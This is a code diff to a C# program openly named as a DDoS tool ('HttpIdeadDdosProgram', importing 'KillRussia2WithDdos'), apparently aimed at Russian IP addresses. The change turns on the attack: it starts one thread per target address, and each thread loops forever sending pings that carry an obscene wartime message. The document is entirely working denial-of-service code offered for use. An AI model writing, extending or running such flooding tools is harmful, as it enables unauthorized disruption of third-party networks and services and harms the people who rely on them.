@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Net.NetworkInformation;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using KillRussia2WithDdos;
 
@@ -23,42 +24,41 @@ namespace HttpIdeadDdosProgram
             }
             foreach (var item in ipaddresses)
             {
-                Console.WriteLine(item);
-                //DdosManager.Launch(threads, item);
+                //Console.WriteLine(item);
+                DdosManager.Launch(ipaddresses);
             }
 
             Console.ReadKey();
+            DdosManager.AbortThreads();
         }
     }
     class DdosManager
     {
-        public static List<DdosGoAhead> list = new();
-        public static void Launch(int quantity, string url)
+        public static List<Thread> list=new();
+        public static void Launch(List<string> ips)
         {
             try
             {
-                for (int i = 0; i < quantity; i++)
+                foreach (var item in ips)
                 {
-                    list.Add(new DdosGoAhead());
+                    list.Add(new Thread(async () => await new DdosGoAhead().SendRequest(item)));
                 }
-                while (true)
-                {
-                    list.ForEach(async x =>
-                    {
-                        await x.SendRequest(url);
-                    });
-                    //System.Threading.Thread.Sleep(31000);
-                    if (DdosGoAhead.numerator % 1000 == 0)
-                    {
-                        GC.Collect();
-                    }
-                }
+                LaunchThreads();
             }
             catch (Exception ex)
             {
                 Console.WriteLine(ex.Message);
             }
 
+        }
+
+        public static void LaunchThreads()
+        {
+            list.ForEach(x=>x.Start());
+        }
+        public static void AbortThreads()
+        {
+            list.ForEach(x => x.Abort());
         }
     }
     class DdosGoAhead
@@ -66,20 +66,20 @@ namespace HttpIdeadDdosProgram
         public static long numerator = default;
         public async Task SendRequest(string ip)
         {
-            //begin:
             try
             {
-
-                Ping ping = new();
-                PingOptions options = new PingOptions(10, true);
-                byte[] data = Encoding.ASCII.GetBytes("Russkiy korabl didi nahui");
-                PingReply reply = await ping.SendPingAsync(ip, 30, data, options);
-                Console.WriteLine(ip + " Status-> " + reply.Status);
+                while (true)
+                {
+                    Ping ping = new();
+                    PingOptions options = new PingOptions(10, true);
+                    byte[] data = Encoding.ASCII.GetBytes("Russkiy korabl didi nahui");
+                    PingReply reply = await ping.SendPingAsync(ip, 30, data, options);
+                    Console.WriteLine(ip + " Status-> " + reply.Status);
+                }
             }
             catch (Exception ex)
             {
                 Console.WriteLine(ex.Message);
-                //goto begin;
             }
 
         }
